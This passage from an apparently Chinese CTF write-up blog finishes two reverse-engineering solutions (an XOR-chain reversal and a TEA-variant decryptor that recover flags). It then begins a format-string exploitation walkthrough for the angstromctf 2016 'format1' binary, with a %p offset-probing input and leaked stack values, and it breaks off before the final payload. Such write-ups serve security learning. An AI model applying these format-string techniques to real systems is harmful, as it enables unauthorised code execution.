class="number">1</span>, <span class="number">68</span>, <span class="number">59</span>, <span class="number">37</span>, <span class="number">19</span>]</span><br></pre></td></tr></table></figure><ol start="2"><li>然后我们开始逆向，先逆向得到  code_re:(转化过的code_10  即是code_re)</li></ol><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">print</span> <span class="string">len(code_10)</span></span><br><span class="line"><span class="string">i=len(code_10)-2#21</span></span><br><span class="line"><span class="string">print</span> <span class="string">i</span></span><br><span class="line"><span class="string">while</span> <span class="string">i&gt;0:</span></span><br><span class="line"><span class="string">code_10[i]</span> <span class="string">=</span> <span class="string">code_10[i]</span> <span class="string">^</span> <span class="string">code_10[i</span> <span class="string">+1]</span></span><br><span class="line"><span class="string">i=i-1</span></span><br><span class="line"><span class="string">print</span> <span class="string">code_10#[31,</span> <span class="number">88</span><span class="string">,</span> <span class="number">74</span><span class="string">,</span> <span class="number">87</span><span class="string">,</span> <span class="number">127</span><span class="string">,</span> <span class="number">79</span><span class="string">,</span> <span class="number">123</span><span class="string">,</span> <span class="number">122</span><span class="string">,</span> <span class="number">124</span><span class="string">,</span> <span class="number">104</span><span class="string">,</span> <span class="number">92</span><span class="string">,</span> <span class="number">112</span><span class="string">,</span> <span class="number">107</span><span class="string">,</span> <span class="number">62</span><span class="string">,</span> <span class="number">1</span><span class="string">,</span> <span class="number">110</span><span class="string">,</span> <span class="number">88</span><span class="string">,</span> <span class="number">114</span><span class="string">,</span> <span class="number">72</span><span class="string">,</span> <span class="number">73</span><span class="string">,</span> <span class="number">13</span><span class="string">,</span> <span class="number">54</span><span class="string">,</span> <span class="number">19</span><span class="string">]</span></span><br><span class="line"><span class="comment">#因为code_10[0]未经我们的逆向运算，所以我们手动 改之，</span></span><br><span class="line"><span class="comment">#code_10[0]=code_10[0]^code_10[1]=31^88=71</span></span><br><span class="line"><span class="comment">#所以 code_re=[31, 88, 74, 87, 127, 79, 123, 122, 124, 104, 92, 112, 107, 62, 1, 110, 88, 114, 72, 73, 13, 54, 19]   即 code_re</span></span><br></pre></td></tr></table></figure><ol start="3"><li>然后继续逆向 得到 flag：</li></ol><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">code_re=[71,</span> <span class="number">88</span><span class="string">,</span> <span class="number">74</span><span class="string">,</span> <span class="number">87</span><span class="string">,</span> <span class="number">127</span><span class="string">,</span> <span class="number">79</span><span class="string">,</span> <span class="number">123</span><span class="string">,</span> <span class="number">122</span><span class="string">,</span> <span class="number">124</span><span class="string">,</span> <span class="number">104</span><span class="string">,</span> <span class="number">92</span><span class="string">,</span> <span class="number">112</span><span class="string">,</span> <span class="number">107</span><span class="string">,</span> <span class="number">62</span><span class="string">,</span> <span class="number">1</span><span class="string">,</span> <span class="number">110</span><span class="string">,</span> <span class="number">88</span><span class="string">,</span> <span class="number">114</span><span class="string">,</span> <span class="number">72</span><span class="string">,</span> <span class="number">73</span><span class="string">,</span> <span class="number">13</span><span class="string">,</span> <span class="number">54</span><span class="string">,</span> <span class="number">19</span><span class="string">]</span></span><br><span class="line"><span class="string">print</span> <span class="string">len(code_re)#23</span></span><br><span class="line"><span class="string">flag=''</span></span><br><span class="line"><span class="string">for</span> <span class="string">i</span> <span class="string">in</span> <span class="string">range(23):</span></span><br><span class="line">    <span class="string">flag+=chr((code_re[i]-i)%128)</span></span><br><span class="line"><span class="string">print</span> <span class="string">flag#GWHT&#123;Just_Re_1s_Ha66y!&#125;</span></span><br></pre></td></tr></table></figure><h2 id="xxor"><a href="#xxor" class="headerlink" title="xxor"></a>xxor</h2><blockquote><p>这道逆向题，做的要难受死了，分析了好久怎么就感觉无解，然后官方说题目有些问题，重新修复才OK做掉！ 我们看下程序的main函数先：（详见注释即可）</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **k, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+8h] [rbp-68h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> j; <span class="comment">// [rsp+Ch] [rbp-64h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+10h] [rbp-60h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+18h] [rbp-58h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+20h] [rbp-50h]</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+28h] [rbp-48h]</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+30h] [rbp-40h]</span></span><br><span class="line">  __int64 v; <span class="comment">// [rsp+40h] [rbp-30h]</span></span><br><span class="line">  __int64 v12; <span class="comment">// [rsp+48h] [rbp-28h]</span></span><br><span class="line">  __int64 v13; <span class="comment">// [rsp+50h] [rbp-20h]</span></span><br><span class="line">  __int64 v14; <span class="comment">// [rsp+58h] [rbp-18h]</span></span><br><span class="line">  __int64 v15; <span class="comment">// [rsp+60h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v16; <span class="comment">// [rsp+68h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v16 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Let us play a game?"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"you have six chances to input"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Come on!"</span>);</span><br><span class="line">  v6 = <span class="number">0L</span>L;</span><br><span class="line">  v7 = <span class="number">0L</span>L;</span><br><span class="line">  v8 = <span class="number">0L</span>L;</span><br><span class="line">  v9 = <span class="number">0L</span>L;</span><br><span class="line">  v10 = <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">5</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s"</span>, <span class="string">"input: "</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)i);</span><br><span class="line">    __isoc99_scanf(<span class="string">"%d"</span>, (<span class="keyword">char</span> *)&amp;v6 + <span class="number">4</span> * i);  <span class="comment">// 输入  6个 整形数据</span></span><br><span class="line">  &#125;</span><br><span class="line">  v = <span class="number">0L</span>L;</span><br><span class="line">  v12 = <span class="number">0L</span>L;</span><br><span class="line">  v13 = <span class="number">0L</span>L;</span><br><span class="line">  v14 = <span class="number">0L</span>L;</span><br><span class="line">  v15 = <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">4</span>; j += <span class="number">2</span> )                 <span class="comment">// 将第一个和第二个，第三个和第三个，第五个和第六数据 分别加密</span></span><br><span class="line">  &#123;</span><br><span class="line">    dword_601078 = *((_DWORD *)&amp;v6 + j);</span><br><span class="line">    dword_60107C = *((_DWORD *)&amp;v6 + j + <span class="number">1</span>);</span><br><span class="line">    sub_400686((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)&amp;dword_601078, &amp;::k);<span class="comment">// 这是个tea的变种加密算法  密钥为2，2，3，4</span></span><br><span class="line">    *((_DWORD *)&amp;v + j) = dword_601078;</span><br><span class="line">    *((_DWORD *)&amp;v + j + <span class="number">1</span>) = dword_60107C;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)sub_400770(&amp;v) != <span class="number">1</span> )      <span class="comment">// 加密后的六个数据要等于指定数  便是成功了，我们进函数里面看看</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"NO NO NO~ "</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Congratulation!\n"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"You seccess half\n"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Do not forget to change input to hex and combine~\n"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"ByeBye"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>总体思路很明确我们输入  6个数（可以理解为一个数组），下标为 0 2 4的数分别与下标为1 3 5的数做tea的变种加密算法，然后如果加密过后的数据和指定的数一样，就说明“You seccess half”成功了一半！</p></blockquote><blockquote><p>我们进去sub_400770函数里面看下  指定数  是 什么：</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __int64 __<span class="function">fastcall <span class="title">sub_400770</span><span class="params">(_DWORD *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1[<span class="number">2</span>] - a1[<span class="number">3</span>] != <span class="number">2225223423L</span>L || a1[<span class="number">3</span>] + a1[<span class="number">4</span>] != <span class="number">4201428739L</span>L || a1[<span class="number">2</span>] - a1[<span class="number">4</span>] != <span class="number">1121399208L</span>L )</span><br><span class="line">  &#123;                                             <span class="comment">// 很容易计算出：</span></span><br><span class="line">                                                <span class="comment">// al[2]=3774025685</span></span><br><span class="line">                                                <span class="comment">// al[3]=1548802262</span></span><br><span class="line">                                                <span class="comment">// al[4]=2652626477</span></span><br><span class="line">                                                <span class="comment">// </span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Wrong!"</span>);</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( *a1 != <span class="number">3746099070</span> || a1[<span class="number">5</span>] != <span class="number">2230518816</span> || a1[<span class="number">1</span>] != <span class="number">550153460</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Wrong!"</span>);                             <span class="comment">// a1[0]=3746099070</span></span><br><span class="line">                                                <span class="comment">// a1[1]=550153460</span></span><br><span class="line">                                                <span class="comment">// a1[5]=2230518816</span></span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"good!"</span>);</span><br><span class="line">    result = <span class="number">1L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>所以可以写出 解密函数  将这些指定的6个数 解密去得到 我们应该输入的6个数<br>我们先看下 它的加密算法sub_400686函数（为了理解，我将部分变量名重命名了）：</p></blockquote><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">   __int64 __fastcall <span class="keyword">sub_400686(unsigned </span>int *<span class="built_in">a1</span>, _DWORD *<span class="built_in">a2</span>)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 result<span class="comment">; // rax</span></span><br><span class="line">  unsigned int <span class="built_in">v0</span><span class="comment">; // [rsp+1Ch] [rbp-24h]</span></span><br><span class="line">  unsigned int <span class="built_in">v1</span><span class="comment">; // [rsp+20h] [rbp-20h]</span></span><br><span class="line">  int sum<span class="comment">; // [rsp+24h] [rbp-1Ch]</span></span><br><span class="line">  unsigned int i<span class="comment">; // [rsp+28h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">v0</span> = *<span class="built_in">a1</span>;</span><br><span class="line">  <span class="built_in">v1</span> = <span class="built_in">a1</span>[<span class="number">1</span>];</span><br><span class="line">  sum = <span class="number">0</span>;</span><br><span class="line">  for ( i = <span class="number">0</span><span class="comment">; i &lt;= 0x3F; ++i )</span></span><br><span class="line">  &#123;</span><br><span class="line">    sum += <span class="number">0x458BCD42</span>;</span><br><span class="line">    <span class="built_in">v0</span> += (<span class="built_in">v1</span> + sum + <span class="number">11</span>) ^ ((<span class="built_in">v1</span> &lt;&lt; <span class="number">6</span>) + *<span class="built_in">a2</span>) ^ ((<span class="built_in">v1</span> &gt;&gt; <span class="number">9</span>) + <span class="built_in">a2</span>[<span class="number">1</span>]) ^ <span class="number">0x20</span>;</span><br><span class="line">    <span class="built_in">v1</span> += (<span class="built_in">v0</span> + sum + <span class="number">20</span>) ^ ((<span class="built_in">v0</span> &lt;&lt; <span class="number">6</span>) + <span class="built_in">a2</span>[<span class="number">2</span>]) ^ ((<span class="built_in">v0</span> &gt;&gt; <span class="number">9</span>) + <span class="built_in">a2</span>[<span class="number">3</span>]) ^ <span class="number">0x10</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *<span class="built_in">a1</span> = <span class="built_in">v0</span>;</span><br><span class="line">  result = <span class="built_in">v1</span>;</span><br><span class="line">  <span class="built_in">a1</span>[<span class="number">1</span>] = <span class="built_in">v1</span>;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>于是我们反着写出相对应的解密函数即可：</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="comment">//解密函数  </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">decrypt</span> <span class="params">(<span class="keyword">uint32_t</span>* v, <span class="keyword">uint32_t</span>* k)</span> </span>&#123;  </span><br><span class="line">    <span class="keyword">uint32_t</span> v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>], sum=<span class="number">0x62F35080</span>, i;  <span class="comment">/* set up */</span> </span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"要解密的两个数为："</span>&lt;&lt;v[<span class="number">0</span>]&lt;&lt;<span class="string">" "</span>&lt;&lt;v[<span class="number">1</span>]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">uint32_t</span> delta=<span class="number">0x458BCD42</span>;                   <span class="comment">/* a key schedule constant */</span>  </span><br><span class="line">    <span class="keyword">uint32_t</span> k0=k[<span class="number">0</span>], k1=k[<span class="number">1</span>], k2=k[<span class="number">2</span>], k3=k[<span class="number">3</span>];   <span class="comment">/* cache key */</span>  </span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"4个密钥为:"</span>&lt;&lt;k0&lt;&lt;<span class="string">" "</span>&lt;&lt;k1&lt;&lt;<span class="string">" "</span>&lt;&lt;k2&lt;&lt;<span class="string">" "</span>&lt;&lt;k3&lt;&lt;<span class="string">" "</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i &lt; <span class="number">64</span>; i++) &#123;                         <span class="comment">/* basic cycle start */</span>  </span><br><span class="line">        v1 -= ((((v0&lt;&lt;<span class="number">6</span>) + k2) ^ (v0 + sum + <span class="number">20</span>) ^ ((v0&gt;&gt;<span class="number">9</span>) + k3))^<span class="number">0x10</span>);  </span><br><span class="line">        v0 -= ((((v1&lt;&lt;<span class="number">6</span>) + k0) ^ (v1 + sum + <span class="number">11</span>) ^ ((v1&gt;&gt;<span class="number">9</span>) + k1))^<span class="number">0x20</span>);  </span><br><span class="line">        sum -= delta;  </span><br><span class="line">    &#125;                                              <span class="comment">/* end cycle */</span>  </span><br><span class="line">    v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1;  </span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"解密得到的两个数为："</span>&lt;&lt;hex&lt;&lt;v[<span class="number">0</span>]&lt;&lt;<span class="string">" "</span>&lt;&lt;v[<span class="number">1</span>]&lt;&lt;<span class="string">" "</span>&lt;&lt;sum&lt;&lt;<span class="built_in">endl</span>;<span class="comment">//     c4e0f47bbec64f70  67e658373cb48520   3140675d46307c1b    2e68b0673d682440  460874140da827bb   11ca5a82e0c5d2e7</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line"> <span class="comment">//要解密的6个数    a0=3746099070 a1=550153460  a2=3774025685     a3=1548802262  a4=2652626477   a5=2230518816</span></span><br><span class="line"> <span class="keyword">uint32_t</span> ming[<span class="number">2</span>]=&#123;<span class="number">2652626477</span>,<span class="number">2230518816</span>&#125;;</span><br><span class="line"> <span class="keyword">uint32_t</span> key[<span class="number">4</span>]=&#123;<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;;</span><br><span class="line">decrypt(ming,key);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="comment">//解密得到的6个数   a0=666c61   a1=677b72      a2=655f69    a3=735f67      a4=726561    a5=74217d</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><blockquote><p>然后用python脚本将其转换为  ascii即可</p></blockquote><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">a</span>=[<span class="number">0x66</span>,<span class="number">0x6c</span>,<span class="number">0x61</span>,<span class="number">0x67</span>,<span class="number">0x7b</span>,<span class="number">0x72</span>,<span class="number">0x65</span>,<span class="number">0x5f</span>,<span class="number">0x69</span>,<span class="number">0x73</span>,<span class="number">0x5f</span>,<span class="number">0x67</span>,<span class="number">0x72</span>,<span class="number">0x65</span>,<span class="number">0x61</span>,<span class="number">0x74</span>,<span class="number">0x21</span>,<span class="number">0x7d</span>]</span><br><span class="line">print <span class="built_in">len</span>(<span class="keyword">a</span>)<span class="comment">#18</span></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">18</span>):</span><br><span class="line">    flag+=chr(<span class="keyword">a</span>[i])</span><br><span class="line">print flag<span class="comment">#flag&#123;re_is_great!&#125;</span></span><br></pre></td></tr></table></figure><h1 id="希望我在安全这条路上越走越远！"><a href="#希望我在安全这条路上越走越远！" class="headerlink" title="希望我在安全这条路上越走越远！"></a>希望我在安全这条路上越走越远！</h1><p><img src="https://s2.ax1x.com/2019/11/17/MsBTUS.jpg" alt="MsBTUS.jpg"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;以md形式上交wp！觉得要比word形式实用的多！&lt;/p&gt;
    
    </summary>
    
    
      <category term="ctf_wp" scheme="http://yoursite.com/tags/ctf-wp/"/>
    
  </entry>
  
  <entry>
    <title>angstromctf 2016-format1</title>
    <link href="http://yoursite.com/2019/11/24/angstromctf%202016-format1/"/>
    <id>http://yoursite.com/2019/11/24/angstromctf 2016-format1/</id>
    <published>2019-11-24T12:46:31.000Z</published>
    <updated>2019-11-24T12:48:06.767Z</updated>
    
    <content type="html"><![CDATA[<p>64位elf程序，这个应该是个很基础的  格式化字符串程序，</p><a id="more"></a><h1 id="angstromctf-2016-format1"><a href="#angstromctf-2016-format1" class="headerlink" title="angstromctf 2016-format1"></a>angstromctf 2016-format1</h1><h2 id="查看程序属性和保护"><a href="#查看程序属性和保护" class="headerlink" title="查看程序属性和保护"></a>查看程序属性和保护</h2><blockquote><p>file format1</p></blockquote><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">format1:</span> <span class="string">ELF</span> <span class="number">64</span><span class="string">-bit</span> <span class="string">LSB</span> <span class="string">executable,</span> <span class="string">x86-64,</span> <span class="string">version</span> <span class="number">1</span> <span class="string">(SYSV),</span> <span class="string">dynamically</span> <span class="string">linked,</span> <span class="string">interpreter</span> <span class="string">/lib64/l,</span> <span class="string">for</span> <span class="string">GNU/Linux</span> <span class="number">2.6</span><span class="number">.24</span><span class="string">,</span> <span class="string">BuildID[sha1]=81b6baaebe2601ee87fb569a4a23aaa00c67dd57,</span> <span class="string">not</span> <span class="string">stripped</span></span><br></pre></td></tr></table></figure><blockquote><p>checksec format1</p></blockquote><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">Arch:</span>     <span class="string">amd64-64-little</span></span><br><span class="line"><span class="attr">RELRO:</span>    <span class="string">Partial</span> <span class="string">RELRO</span></span><br><span class="line"><span class="attr">Stack:</span>    <span class="string">Canary</span> <span class="string">found</span></span><br><span class="line"><span class="attr">NX:</span>       <span class="string">NX</span> <span class="string">enabled</span></span><br><span class="line"><span class="attr">PIE:</span>      <span class="literal">No</span> <span class="string">PIE</span> <span class="string">(0x400000)</span></span><br></pre></td></tr></table></figure><blockquote><p>简单运行下</p></blockquote><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ ./format1 </span><br><span class="line">mutou</span><br><span class="line">mutou</span><br><span class="line">Sorry,<span class="built_in"> secret </span>= 0</span><br><span class="line"><span class="comment">#猜测  应该是将我们的输入原样输出，然后会一个判断，进而输出 "Sorry, secret = 0"</span></span><br></pre></td></tr></table></figure><h2 id="拖入ida："><a href="#拖入ida：" class="headerlink" title="拖入ida："></a>拖入ida：</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+10h] [rbp-90h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+98h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x80</span>uLL);</span><br><span class="line">  fgets(&amp;s, <span class="number">128</span>, _bss_start);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;s, <span class="number">128L</span>L, argv);   <span class="comment">//利用格式化字符串漏洞 将其（secret）改成192  就好</span></span><br><span class="line">  <span class="keyword">if</span> ( secret == <span class="number">192</span> )          <span class="comment">//关键判断 需要将 变量 secret所在地址中的值 =192</span></span><br><span class="line">    give_shell();               <span class="comment">//只要执行了这个函数 就拿到 shellcode了</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Sorry, secret = %d\n"</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)secret);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li>首先找 偏移</li><li>然后将需要的地址找到     secret_addr</li><li>构造payload      将  secret =192</li></ol><blockquote><h3 id="找偏移：8"><a href="#找偏移：8" class="headerlink" title="找偏移：8"></a>找偏移：8</h3></blockquote><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">aaaaaaaa%p<span class="built_in">..</span>%p<span class="built_in">..</span>%p<span class="built_in">..</span>%p<span class="built_in">..</span>%p<span class="built_in">..</span>%p<span class="built_in">..</span>%p<span class="built_in">..</span>%p<span class="built_in">..</span>%p<span class="built_in">..</span>%p<span class="built_in">..</span>%p<span class="built_in">..</span>%p<span class="built_in">..</span>%p<span class="built_in">..</span>%p<span class="built_in">..</span>%p<span class="built_in">..</span>%p<span class="built_in">..</span>%p<span class="built_in">..</span></span><br><span class="line">%p<span class="built_in">..</span>%p<span class="built_in">..</span>%p<span class="built_in">..</span>%p<span class="built_in">..</span>%p<span class="built_in">..</span>%p<span class="built_in">..</span>%p<span class="built_in">..</span>%p<span class="built_in">..</span>%p<span class="built_in">..</span>%p<span class="built_in">..</span>%p<span class="built_in">..</span>%p<span class="built_in">..</span>%p<span class="built_in">..</span>%p<span class="built_in">..</span>%p<span class="built_in">..</span></span><br><span class="line"></span><br><span class="line">aaaaaaaa0xd2105d<span class="built_in">..</span>0x7f8d7b31a790<span class="built_in">..</span>0xa2e2e70<span class="built_in">..</span>0xd2105d<span class="built_in">..</span>0x2e2e70252e2e7025<span class="built_in">..</span>0x7ffebead2648<span class="built_in">..</span>0x100000000<span class="built_in">..</span>0x6161616161616161<span class="built_in">..</span>0x2e2e70252e2e7025<span class="built_in">..</span>0x2e2e70252e2e7025<span class="built_in">..</span>0x2e2e70252e2e7025<span class="built_in">..</span>0x2e2e70252e2e7025<span class="built_in">..</span>0x2e2e70252e2e7025<span class="built_in">..</span>0x2e2e70252e2e7025<span class="built_in">..</span>0x2e2e70252e2e7025<span class="built_in">..</span>0x2e2e70252e2e7025<span class="built_in">..</span>0xa2e2e7025<span 